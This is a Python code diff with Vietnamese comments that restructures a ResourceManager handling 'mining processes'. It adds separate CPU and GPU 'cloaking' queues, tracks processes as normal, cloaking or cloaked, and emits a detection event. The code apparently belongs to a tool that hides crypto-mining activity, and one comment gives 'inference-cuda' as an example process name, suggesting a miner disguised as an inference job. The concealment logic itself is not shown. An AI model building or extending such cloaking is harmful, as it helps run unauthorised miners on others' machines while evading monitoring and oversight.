@@ -212,7 +212,11 @@ class ResourceManager(IResourceManager):
         self.mining_processes_lock = threading.RLock()
         self.mining_processes: List[MiningProcess] = []
 
-        # Hàng đợi cloaking
+        # Hàng đợi cloaking riêng biệt cho CPU và GPU (theo blueprint)
+        self._cpu_cloaking_queue = queue.PriorityQueue()
+        self._gpu_cloaking_queue = queue.PriorityQueue()
+        
+        # Hàng đợi cloaking chung (legacy compatibility)
         self.resource_adjustment_queue = queue.PriorityQueue()
 
         # Thread workers
@@ -223,7 +227,7 @@ class ResourceManager(IResourceManager):
         self._counter = count()
         self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"
 
-        self.logger.info("ResourceManager.__init__ (chỉ cloaking)")
+        self.logger.info("ResourceManager.__init__ (redesigned với CPU/GPU cloaking queues)")
 
         # Đăng ký event 'resource_adjustment' (nếu cần)
         self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
@@ -242,40 +246,53 @@ class ResourceManager(IResourceManager):
 
     def enqueue_cloaking(self, process: MiningProcess) -> None:
         """
-        Đặt yêu cầu cloaking cho tiến trình vào hàng đợi.
+        Đưa tiến trình vào hàng đợi cloaking phù hợp.
+        Redesigned theo blueprint: CPU/GPU queues riêng biệt.
         """
+        pid = process.pid
+        name = process.name
+        
         try:
-            if self.process_states.get(process.pid) == "cloaked":
-                self.logger.debug(f"PID={process.pid} đã được cloaked, bỏ qua.")
+            if self.process_states.get(pid) == "cloaked":
+                self.logger.debug(f"PID={pid} đã được cloaked, bỏ qua.")
                 return
 
             priority = process.priority
             count_val = next(self._counter)
             
-            # ---------------------------------------------
-            # XÁC ĐỊNH CHIẾN LƯỢC CLOAKING THEO LOẠI TIẾN TRÌNH
-            # ---------------------------------------------
-            # • Nếu là tiến trình GPU (VD: inference-cuda) → chỉ áp dụng 'gpu_cloaking'
-            # • Ngược lại (CPU)                         → chỉ áp dụng 'cpu_cloaking'
-
-            if hasattr(process, "is_gpu_process") and process.is_gpu_process():
-                strategies = ['gpu_cloaking']  # Chỉ che giấu GPU
-            else:
-                strategies = ['cpu_cloaking']  # Chỉ che giấu CPU
+            # Phân loại tiến trình theo blueprint
+            is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
             
             task = {
                 'type': 'cloaking',
                 'process': process,
-                'strategies': strategies
+                'strategies': ['gpu_cloaking'] if is_gpu else ['cpu_cloaking']
             }
             
+            # Thêm vào hàng đợi thích hợp theo blueprint
+            if is_gpu:
+                self.logger.info(f"Đưa {name} (PID={pid}) vào GPU cloaking queue")
+                self._gpu_cloaking_queue.put((priority, count_val, task))
+            else:
+                self.logger.info(f"Đưa {name} (PID={pid}) vào CPU cloaking queue")
+                self._cpu_cloaking_queue.put((priority, count_val, task))
+                
+            # Thêm vào queue chung cho legacy compatibility
             self.resource_adjustment_queue.put((priority, count_val, task))
-            self.process_states[process.pid] = "cloaking"
+            self.process_states[pid] = "cloaking"
             
-            self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}) với strategies: {strategies}")
+            # Gửi event thông báo có process mới (theo blueprint)
+            self.event_bus.publish('new_process_detected', {
+                'pid': pid,
+                'name': name,
+                'is_gpu': is_gpu,
+                'timestamp': time.time()
+            })
+            
+            self.logger.info(f"✅ Đã enqueue cloaking cho {name} (PID={pid}) - {'GPU' if is_gpu else 'CPU'} queue")
             
         except Exception as e:
-            self.logger.error(f"Lỗi khi enqueue cloaking cho PID={process.pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")
 
     # -----------------------------------------------------------------------------------------
     # METRICS (SYNC)
